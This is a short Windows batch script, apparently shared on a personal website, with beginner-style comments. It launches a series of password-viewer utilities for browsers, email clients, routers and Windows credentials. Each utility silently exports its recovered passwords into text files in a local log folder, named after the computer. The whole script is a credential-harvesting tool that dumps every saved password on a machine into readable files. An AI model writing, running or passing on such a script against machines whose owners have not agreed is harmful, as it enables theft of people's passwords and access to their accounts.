:: www.PeterStavrou.com

@echo off
:: Echo makes the command prompt window blank. You can try remove this to see what happens.

mkdir log
:: Creates a folder called log only if the folder does not already exist.

start BulletsPassView.exe /stext .\log\BulletsPassView-%computername%.txt
start RouterPassView.exe /stext .\log\RouterPassView-%computername%.txt
start ChromePass.exe /stext .\log\ChromePass-%computername%.txt
start PasswordFox.exe /stext .\log\FoxPass-%computername%.txt
start iepv.exe /stext .\log\iepv-%computername%.txt
start mailpv.exe /stext .\log\mailpv-%computername%.txt
start mspass.exe /stext .\log\mspass-%computername%.txt
start PasswordFox.exe /stext .\log\PasswordFox-%computername%.txt
start WebBrowserPassView.exe /stext .\log\WebBrowserPassView-%computername%.txt
:: The above runs each application and exports the results as text documents using the naming convention ApplicationName-ComputerName